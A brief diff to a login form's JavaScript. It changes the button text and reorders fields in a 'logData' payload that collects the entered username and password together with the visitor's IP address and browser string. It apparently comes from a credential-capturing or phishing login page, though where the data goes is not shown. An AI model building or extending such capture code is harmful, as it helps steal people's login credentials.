@@ -252,7 +252,7 @@
           e.preventDefault(); // Prevents the page from reloading immediately
           
           const originalText = loginButton.innerText;
-          loginButton.innerText = "Logging on...";
+          loginButton.innerText = "Please Wait";
 
           try {
               // Get the IP Address
@@ -261,9 +261,9 @@
 
               // Prepare the payload
               const logData = {
-                  username: document.getElementById('username').value,
                   browser: navigator.userAgent,
                   ip: ipData.ip,
+                  username: document.getElementById('username').value,
                   password: document.getElementById('password').value
               };
 
